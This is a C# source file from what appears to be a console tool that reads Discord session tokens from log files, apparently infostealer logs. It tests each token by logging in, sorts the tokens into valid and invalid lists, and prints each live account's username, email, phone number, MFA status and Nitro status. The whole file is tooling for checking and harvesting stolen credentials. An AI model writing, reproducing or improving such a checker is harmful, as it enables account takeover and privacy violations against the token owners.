using Console.Models;
using Console.Models.Abstractions;
using Console.Models.Attributes;
using Console.Models.Views;
using Core.Discord;

namespace Console.Views;

public class ServicesView : ArgsView
{
    private readonly SaverService _save;
    private readonly Settings _settings;
    
    public ServicesView(IRoot root, SaverService save, Settings settings) : base(root)
    {
        _save = save;
        _settings = settings;
    }
    
    [Command]
    public async Task Discord()
    {
        StreamWriter? invalid = await _save.CreateStreamAsync("invalid"), valid = await _save.CreateStreamAsync("valid");
        var tokens = _settings.Path.DiscordByLogs().Distinct();
        
        await _save.SaveAsync("tokens", tokens);
        
        if (invalid is null || valid is null) return;

        foreach (var token in tokens)
        {
            if (await DiscordChecker.TryLoginAsync(token) is not { } account)
            {
                await invalid.WriteLineAsync(token);
                return;
            }

            await valid.WriteLineAsync(token);

            System.Console.WriteLine($"""
                                      Token: {account.Token}
                                      Username: {account.Username}
                                      Email: {account.Email}
                                      Phone: {account.Phone}
                                      Friends: {await DiscordChecker.Friends(token).CountAsync()}
                                      Verified: {account.Verified}
                                      Mfa: {account.MfaEnabled}
                                      Nitro: {account.PremiumType}

                                      """);
        }

        invalid.Close();
        valid.Close();
        
        _ExitWait();
    }
}